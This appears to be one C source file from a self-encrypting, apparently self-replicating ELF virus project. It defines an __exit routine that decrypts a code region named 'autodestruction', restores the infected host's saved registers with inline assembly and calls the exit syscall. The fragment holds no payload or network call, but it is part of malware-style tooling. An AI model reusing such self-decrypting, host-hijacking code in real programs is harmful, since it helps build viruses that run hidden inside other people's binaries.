#include <war.h>

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void __exit(const struct s_host *host, struct s_keychain *keychain)
{
	decrypt_right(keychain, (char *)autodestruction, (void *)__exit - (void *)autodestruction);

	asm volatile
	(
	 	"mov rsp, %0\n"
		:
		: "g"(host->rsp)
	);

	asm volatile
	(
	 	"pop r15\n"
		"pop r14\n"
		"pop r13\n"
		"pop r12\n"
		"pop r11\n"
		"pop r10\n"
		"pop r9\n"
		"pop r8\n"
		"pop rcx\n"
		"pop rdx\n"
		"pop rsi\n"
		"pop rdi\n"
		"pop rax\n"
		"pop rbx\n"
		"pop rbp\n"
		"pop rsp\n"
		"add rsp, 0x8\n"
	 	"mov rax, 0x3c\n"
		"syscall\n"
	);
}
